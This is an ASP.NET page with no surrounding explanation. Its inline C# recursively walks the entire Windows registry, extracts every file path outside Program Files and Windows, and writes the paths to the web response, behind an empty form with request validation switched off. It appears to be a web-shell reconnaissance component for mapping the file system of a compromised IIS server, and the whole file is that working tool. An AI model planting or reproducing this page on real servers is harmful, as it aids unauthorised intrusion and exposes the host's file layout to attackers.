<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Collections" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ import Namespace="System.Collections.Generic"%>
<%@ Import Namespace="System.Threading"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.VisualBasic"%>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<%
        Stack sack = new Stack();//测试成功，比较卡
        List<String> list = new List<String>();
        sack.Push(Registry.ClassesRoot);
        sack.Push(Registry.CurrentConfig);
        sack.Push(Registry.CurrentUser);
        sack.Push(Registry.LocalMachine);
        sack.Push(Registry.Users);
        while (sack.Count > 0)
        {
            RegistryKey Hklm = (RegistryKey)sack.Pop();
            if (Hklm != null)
            {
                try
                {
                    string[] names = Hklm.GetValueNames();
                    foreach (string name in names)
                    {
                        try
                        {
                            string str = Hklm.GetValue(name).ToString().ToLower();
                            if (str.IndexOf(":\\") != -1 && str.IndexOf("c:\\program files") == -1 && str.IndexOf("c:\\windows") == -1)
                            {
                                Regex regImg = new Regex("[a-z|A-Z]{1}:\\\\[a-z|A-Z| |0-9|\u4e00-\u9fa5|\\~|\\\\|_|{|}|\\.]*");
                                MatchCollection matches = regImg.Matches(str);
                                if (matches.Count > 0)
                                {
                                    string temp = "";
                                    foreach (Match match in matches)
                                    {
                                        temp = match.Value;
                                        if (!temp.EndsWith("\\"))
                                        {
                                            if (list.IndexOf(temp) == -1)
                                            {
                                                Response.Write(temp + "<br/>");
                                                list.Add(temp);
                                            }
                                        }
                                        else
                                            temp = temp.Substring(0, temp.LastIndexOf("\\"));
                                        while (temp.IndexOf("\\") != -1)
                                        {
                                            if (list.IndexOf(temp + "\\") == -1)
                                            {
                                                Response.Write(temp + "\\<br/>");
                                                list.Add(temp + "\\");
                                            }
                                            temp = temp.Substring(0, temp.LastIndexOf("\\"));
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception se) { }
                    }
                }
                catch (Exception ee) { }
                try
                {
                    string[] keys = Hklm.GetSubKeyNames();
                    foreach (string key in keys)
                    {
                        try
                        {
                            sack.Push(Hklm.OpenSubKey(key));
                        }
                        catch (System.Security.SecurityException sse) { }
                    }
                }
                catch (Exception ee) { }
            }
        }
%>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <div> 
    </div>
    </form>
</body>
</html>
